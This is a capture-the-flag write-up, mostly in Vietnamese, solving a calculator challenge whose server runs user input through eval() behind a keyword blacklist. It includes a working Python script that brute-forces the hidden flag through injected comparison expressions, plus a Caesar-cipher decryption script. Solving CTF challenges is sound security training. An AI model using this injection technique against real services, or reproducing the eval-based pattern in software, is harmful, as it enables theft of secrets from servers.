# UMDCTF - A Simple Calculator

.....

## Review source code
```python
# .....
from secrets import flag_enc, ws
#....

def z(f: str):
    for w in ws:
        if w in f:
            raise Exception("nope")
    return True
# .....

@app.route('/calc', methods=['POST'])
def calc():
    val = 0
    try:
        z(request.json['f'])
        val = f"{int(eval(request.json['f']))}"
# .....
```
File `secrets.py` có chứa `flag_enc` và `ws` được import vào `app.py`. `ws` có chứa các blacklist keyword đã được dấu khi trước khi public source-code. Server nhận f parameter đi qua hàm z, nếu trùng với blacklist thì sẽ trả về lỗi còn nếu không thì được đi vào `eval()`. 

Fuzz qua thì biết được hàm `ord()` và một số kí tự khác như `\` bị block nên không thể bypass hàm `z` hay đọc result dạng từng số ascii nên ta sẽ brute-foce `flag_enc` bằng cách cắt ra từng kí tự rồi so sánh từng cái thôi. 

**Python scripts**: Brute-force encrypted flag
```python
import requests
import string

url = 'https://calculator-w78ar.ondigitalocean.app/'
characters = string.ascii_letters + string.digits + string.punctuation
# val = f"{int(eval(request.json['f']))}"

flag = ''
for i in range(len(flag), 100):
    for c in characters:
        json = {
            "f": f"flag_enc[{i}:{i+1}] == '{c}'"
        }

        r = requests.post(url+'calc', json=json)

        result = r.json()['result']
        print(flag+c)

        if result == '1':
            flag += c
            print('[FOUND] : ' + flag)

            if c == '}':
                exit('done!')
            break
```

**encrypted flag**: `OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}`

Flag nhận được đã bị encrypt bằng hàm `encrypt()` trong file `secrets.py`. 

**Python scripts**: Decrypt encrypted flag
```python
FLAG = 'OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}'

def encrypt(text: str, key: int):
    result = ''

    for c in text:
        if c.isupper():
            c_index = ord(c) - ord('A')
            c_shifted = (c_index + key) % 26 + ord('A')
            result += chr(c_shifted)
        elif c.islower():
            c_index = ord(c) - ord('a')
            c_shifted = (c_index + key) % 26 + ord('a')
            result += chr(c_shifted)
        elif c.isdigit():
            c_new = (int(c) + key) % 10
            result += str(c_new)
        else:
            result += c

    return result

def reverse(c, er):
    a = ord(c) - ord(er)
    if a >= 20:
        result = a - key + ord(er)
    else:
        result = a + 26 - key + ord(er)
    return chr(result)

def decrypt(text: str, key: int):
    result = ''

    for c in text:
        if c.isupper():
            result += reverse(c, 'A')
        elif c.islower():
            result += reverse(c, 'a')
        elif c.isdigit():
            c_new = (int(c) + key) % 10
            result += str(c_new)
        else:
            result += c

    return result

def find_key():
    for i in range(100):
        if encrypt('UMDCTF', i) == 'OGXWNZ':
            return i

key = find_key()
print(f'[KEY FOUND] : ' + str(key))

flag_dec = decrypt(FLAG, key)
flag_enc = encrypt(flag_dec, key)

print(flag_dec)
print(flag_enc)
```

**flag**: `UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks!}`
